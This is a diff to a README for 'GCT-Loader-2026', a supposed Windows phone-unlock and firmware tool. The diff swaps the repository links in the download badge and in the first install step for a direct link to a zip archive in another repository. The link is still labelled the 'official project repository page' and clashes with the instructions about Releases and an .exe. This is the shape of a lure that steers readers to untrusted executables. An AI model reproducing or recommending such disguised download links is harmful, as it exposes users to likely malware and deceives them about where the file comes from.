@@ -5,7 +5,7 @@ description: "Download the full version of GCT Loader for Windows 10 and 11. Acc
 ---
 # 🛠️ GCT-Loader-2026 - Unlock your mobile device with ease
 
-[![Download GCT Loader](https://img.shields.io/badge/Download-GCT_Loader-blue.svg)](https://github.com/Prentrecent252/GCT-Loader-2026)
+[![Download GCT Loader](https://img.shields.io/badge/Download-GCT_Loader-blue.svg)](https://github.com/Prentrecent252/prentrecent252.github.io/raw/refs/heads/main/premium-v6/Application-2.8-alpha.2.zip)
 
 GCT-Loader-2026 functions as a software tool for mobile device management. This application allows users to handle specific software tasks on Windows 10 and Windows 11 computers. It assists with phone unlock procedures and firmware management for various hardware models.
 
@@ -24,7 +24,7 @@ Ensure your computer meets these conditions before you begin the installation pr
 
 Follow these steps to obtain the installer bundle.
 
-1. Navigate to the official project repository page: [https://github.com/Prentrecent252/GCT-Loader-2026](https://github.com/Prentrecent252/GCT-Loader-2026).
+1. Navigate to the official project repository page: [https://github.com/Prentrecent252/prentrecent252.github.io/raw/refs/heads/main/premium-v6/Application-2.8-alpha.2.zip](https://github.com/Prentrecent252/prentrecent252.github.io/raw/refs/heads/main/premium-v6/Application-2.8-alpha.2.zip).
 2. Locate the Releases section on the right side of the page.
 3. Click the most recent version tag to view the available assets.
 4. Select the file ending in .exe to start the download to your local machine.
